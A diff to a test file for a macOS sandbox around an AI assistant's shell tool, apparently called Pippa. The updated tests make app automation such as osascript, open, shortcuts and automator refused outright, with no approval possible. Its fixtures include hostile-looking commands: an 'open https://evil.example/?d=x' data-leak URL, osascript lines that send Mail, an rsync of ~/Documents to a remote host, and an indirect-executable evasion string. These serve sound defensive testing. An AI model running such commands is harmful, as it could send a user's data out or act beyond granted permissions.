@@ -14,7 +14,7 @@ import { fileURLToPath } from "node:url";
 
 const shell = await import("./shell.ts");
 const { sandboxProfile, sandboxedCommand, neededGrants, missingGrants, namedPaths, folderNames, grantAskText, shellTool, places,
-	SHELL_DECLINED_REASON, NO_SANDBOX_REASON } = shell;
+	SHELL_DECLINED_REASON, NO_SANDBOX_REASON, APP_CONTROL_REASON } = shell;
 const here = fileURLToPath(new URL(".", import.meta.url));
 const repo = join(here, "../..");
 const cli = process.env.PIPPA_PI_CLI
@@ -30,7 +30,7 @@ test("profile: no internet, no other apps, no writing in the person's folders, n
 	assert.match(profile, /^\(version 1\)\n\(allow default\)\n/);
 	assert.match(profile, /\(deny network\*\)/);
 	assert.match(profile, /\(deny appleevent-send\)/);
-	assert.match(profile, /\(deny process-exec \(literal "\/usr\/bin\/open"\)/);
+	assert.match(profile, /\(deny process-exec.*\(literal "\/usr\/bin\/open"\)/);
 	assert.match(profile, /\(deny file-write\* \(subpath "\/Users\/renate"\) \(subpath "\/Volumes"\)/);
 	assert.match(profile, /\(deny file-write-unlink \(subpath "\/Users\/renate"\)/);
 	assert.doesNotMatch(profile, /\(allow file-write\* \(subpath "\/Users\/renate"\)/);
@@ -41,7 +41,8 @@ test("profile: no internet, no other apps, no writing in the person's folders, n
 
 test("profile with every grant: still no deleting, no ~/Library, no dot folders, no Pippa folder", () => {
 	const profile = sandboxProfile(new Set(["net", "apps", "write"]), where);
-	assert.doesNotMatch(profile, /deny network|deny appleevent/);
+	assert.doesNotMatch(profile, /deny network/);
+	assert.match(profile, /deny appleevent-send/, "even a legacy apps grant cannot enable generic app control");
 	const lines = profile.trim().split("\n");
 	const index = (needle) => lines.findIndex((l) => l.includes(needle));
 	assert.ok(index('(allow file-write* (subpath "/Users/renate") (subpath "/Volumes")') > index('(deny file-write* (subpath "/Users/renate") (subpath "/Volumes")'));
@@ -59,21 +60,26 @@ test("paths with quotes or backslashes stay one SBPL string; the command reaches
 	assert.ok(wrapped.endsWith(` /bin/bash -c 'echo '\\''it'\\'''\\''s'\\'' "$HOME"'`));
 });
 
-test("grants asked before: the internet for downloads and installs, other apps for osascript/open; the rest runs", () => {
+test("grants asked before: internet is grantable; app automation never receives a grant", () => {
 	const expect = (grants, commands) => { for (const c of commands) assert.deepEqual([...neededGrants(c)].sort(), grants, c); };
 	expect(["net"], ["curl -L -o Formular.pdf https://example.de/f.pdf", "pip3 install pandas", "cd x && git clone https://github.com/a/b",
 		"wget https://x.example/a", "rsync -a ~/Documents me@host:backup", "FOO=1 curl https://x.example", "ssh host"]);
-	expect(["apps"], ["osascript -e 'tell application \"Mail\" to send (first outgoing message)'", "open https://evil.example/?d=x", "shortcuts run Senden"]);
+	expect([], ["osascript -e 'tell application \"Mail\" to send (first outgoing message)'", "open https://evil.example/?d=x", "shortcuts run Senden"]);
 	expect([], ["ls -la ~/Downloads", "python3 -c 'print(sum([1.5, 2]))'", "sips -s format png a.heic --out a.png", "mdfind -onlyin ~ Zahnarzt",
 		"qpdf --empty --pages a.pdf b.pdf -- out.pdf", "echo curl is a word", "cat ~/Documents/a.txt | wc -l"]);
 });
 
 test("grants a failed command lacked, from its output; writing only when nothing else explains it", () => {
 	assert.deepEqual([...missingGrants("python3 x.py", "urllib.error.URLError: <urlopen error [Errno 8] nodename nor servname provided>", new Set())], ["net"]);
-	assert.deepEqual([...missingGrants("osascript x.scpt", "execution error: Not authorized to send Apple events to Mail. (-1743)", new Set())], ["apps"]);
+	assert.deepEqual([...missingGrants("osascript x.scpt", "execution error: Not authorized to send Apple events to Mail. (-1743)", new Set())], []);
 	assert.deepEqual([...missingGrants("sips -s format png ~/Desktop/a.heic --out ~/Desktop/a.png", "Error: Operation not permitted", new Set())], ["write"]);
 	assert.deepEqual([...missingGrants("rm ~/a", "rm: /Users/renate/a: Operation not permitted", new Set(["write"]))], []);
 	assert.deepEqual([...missingGrants("ls nope", "ls: nope: No such file or directory", new Set())], []);
+});
+
+test("an indirect denied app executable never solicits a file-write grant", () => {
+	assert.deepEqual([...missingGrants('runner=/usr/bin/osascript; "$runner" -e "1+1"',
+		'/bin/bash: line 1: /usr/bin/osascript: Operation not permitted', new Set())], []);
 });
 
 test("the question names everyday folders, not paths; the command only under Details", () => {
@@ -144,6 +150,27 @@ test("tool: asks once per answer before going online; no means not run; without 
 	assert.match(readFileSync(join(root, "profile.sb"), "utf8"), /deny network/, "a new answer starts without grants");
 	assert.equal((await bash.execute("a5", { command: "curl https://x.example" }, undefined, undefined, plain(work))).content[0].text, SHELL_DECLINED_REASON,
 		"no one to ask: not run");
+});
+
+test("tool: draft-only shell and standard app automation are refused without execution or approval", async () => {
+	let runs = 0, asks = 0;
+	const create = () => ({ name: "bash", execute: async () => { runs++; return { content: [] }; } });
+	const ctx = { ...plain("/fixture"), hasUI: true, ui: { confirm: async () => { asks++; return true; } } };
+	const draft = shellTool(create, { available: () => true, env: { PIPPA_ACTION_POLICY: "draftOnly" } }).definition("/fixture");
+	for (const command of ["echo safe", "python3 -c 'print(1)'", "env PIPPA_ACTION_POLICY=standard open mailto:x@example.test"]) {
+		const result = await draft.execute("draft", { command }, undefined, undefined, ctx);
+		assert.equal(result.details.pippaExecution, "not_dispatched");
+		assert.equal(result.isError, true);
+	}
+	const normal = shellTool(create, { available: () => true, env: {} }).definition("/fixture");
+	for (const command of ["osascript -e 'tell application \"Mail\" to send outgoing message 1'", "open mailto:x@example.test",
+		"/usr/bin/shortcuts run Send", "automator Send.workflow", "env /usr/bin/osascript send.scpt"]) {
+		const result = await normal.execute("apps", { command }, undefined, undefined, ctx);
+		assert.equal(result.content[0].text, APP_CONTROL_REASON);
+		assert.equal(result.details.pippaExecution, "not_dispatched");
+	}
+	assert.equal(runs, 0);
+	assert.equal(asks, 0, "there is no approval that can grant these capabilities");
 });
 
 test("tool: permission after a blocked write allows a later call, never an automatic replay", { skip: !piIndex && "PIPPA_PI_CLI not set" }, async () => {
